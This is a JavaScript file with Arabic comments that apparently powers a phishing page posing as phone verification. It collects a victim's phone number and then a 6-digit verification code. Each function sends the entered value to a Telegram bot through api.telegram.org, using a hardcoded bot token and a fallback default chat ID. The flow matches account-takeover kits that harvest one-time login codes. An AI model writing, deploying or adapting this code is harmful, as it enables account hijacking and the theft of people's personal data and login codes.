function getUserIdFromUrl() {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get('user_id');
}

function validatePhoneNumber() {
  const phoneNumber = document.getElementById('phone').value;
  const userId = getUserIdFromUrl();  // استخراج المعرف من الرابط
  
  // التحقق من صحة الرقم
  if (!phoneNumber) {
    document.getElementById('error-message').innerText = "يرجى إدخال رقم الهاتف";
    return;
  }

  const countryCode = phoneNumber.slice(0, 3); // كود الدولة
  let valid = false;
  let message = "";
  
  // التحقق من الرقم بناءً على الدولة
  if (countryCode === '010' || countryCode === '011' || countryCode === '012') {
    if (phoneNumber.length !== 11) {
      valid = false;
      message = "رقم الهاتف المصري يجب أن يتكون من 11 رقمًا";
    } else {
      valid = true;
      message = "الرقم صحيح";
    }
  } else {
    if (phoneNumber.length < 7 || phoneNumber.length > 15) {
      valid = false;
      message = "رقم الهاتف غير صالح، يجب أن يتراوح بين 7 و 15 رقمًا";
    } else {
      valid = true;
      message = "الرقم صحيح";
    }
  }

  // إظهار رسالة الخطأ أو النجاح
  if (!valid) {
    document.getElementById('error-message').innerText = message;
  } else {
    document.getElementById('error-message').innerText = message;
    sendPhoneNumber(phoneNumber, userId);  // إذا الرقم صحيح، يتم إرسال الرقم إلى البوت
  }
}

function sendPhoneNumber(phoneNumber, userId) {
  const botToken = '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E';  // استبدل بـ توكن البوت الخاص بك
  const chatId = getChatIdForUser(userId);  // دالة للحصول على chat_id بناءً على user_id

  // إرسال الرقم إلى البوت عبر تليجرام
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=الرقم المدخل: ${phoneNumber}`;
  fetch(url).then(response => {
    if (response.ok) {
      alert('تم إرسال رقم الهاتف بنجاح! انتظر الكود...');
    } else {
      alert('فشل في إرسال البيانات!');
    }
  });
}

function sendVerificationCode() {
  const verificationCode = document.getElementById('code').value;
  const userId = getUserIdFromUrl();
  
  if (!verificationCode || verificationCode.length !== 6 || isNaN(verificationCode)) {
    alert('الكود يجب أن يتكون من 6 أرقام فقط');
    return;
  }

  const botToken = '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E';
  const chatId = getChatIdForUser(userId);

  // إرسال الكود إلى البوت عبر تليجرام
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=هذا هو الكود: ${verificationCode}`;
  fetch(url).then(response => {
    if (response.ok) {
      alert('تم إرسال الكود بنجاح!');
    } else {
      alert('فشل في إرسال الكود!');
    }
  });
}

// دالة للحصول على chat_id بناءً على user_id
function getChatIdForUser(userId) {
  // هنا يمكنك ربط `user_id` بمعرف الدردشة الخاص بالمستخدم (يمكن أن يتم من قاعدة بيانات)
  // هذه دالة بسيطة لإظهار الفكرة فقط
  const chatIds = {
    '12345': 'CHAT_ID_1',  // هذا معرف الدردشة للمستخدم 12345
    '67890': 'CHAT_ID_2',  // هذا معرف الدردشة للمستخدم 67890
  };

  return chatIds[userId] || '5375214810';  // إذا لم يتم العثور على معرف المستخدم، يتم إرسال البيانات إلى معرف افتراضي
}